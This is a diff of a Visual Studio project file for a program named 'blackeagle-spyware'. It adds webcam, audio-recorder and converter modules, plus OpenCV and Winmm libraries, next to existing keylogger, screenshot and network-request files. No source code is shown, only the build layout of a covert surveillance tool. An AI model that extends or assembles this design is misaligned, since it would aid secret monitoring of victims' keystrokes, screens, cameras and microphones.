@@ -19,19 +19,25 @@
     </ProjectConfiguration>
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="Control\camera.cpp" />
     <ClCompile Include="Control\Keylogger.cpp" />
     <ClCompile Include="BeMain\blackeagle-spyware.cpp" />
     <ClCompile Include="BeMain\manageTasks.cpp" />
     <ClCompile Include="BeMain\taskRoutines.cpp" />
+    <ClCompile Include="Control\Recorder.cpp" />
     <ClCompile Include="Control\Screenshoter.cpp" />
+    <ClCompile Include="DataManagement\converters.cpp" />
     <ClCompile Include="DataManagement\files.cpp" />
     <ClCompile Include="Network\Request.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="Control\camera.h" />
     <ClInclude Include="Control\keylogger.h" />
     <ClInclude Include="BeMain\manageTasks.h" />
     <ClInclude Include="BeMain\taskRoutines.h" />
+    <ClInclude Include="Control\Recorder.h" />
     <ClInclude Include="Control\Screenshoter.h" />
+    <ClInclude Include="DataManagement\converters.h" />
     <ClInclude Include="DataManagement\files.h" />
     <ClInclude Include="Network\Request.h" />
   </ItemGroup>
@@ -96,6 +102,8 @@
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <LinkIncremental>true</LinkIncremental>
+    <IncludePath>C:\opencv\build\include;$(IncludePath)</IncludePath>
+    <LibraryPath>C:\opencv\build\x64\vc15\lib;$(LibraryPath)</LibraryPath>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <LinkIncremental>false</LinkIncremental>
@@ -138,7 +146,7 @@
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>Winhttp.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>Winmm.lib;Winhttp.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;opencv_world455d.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
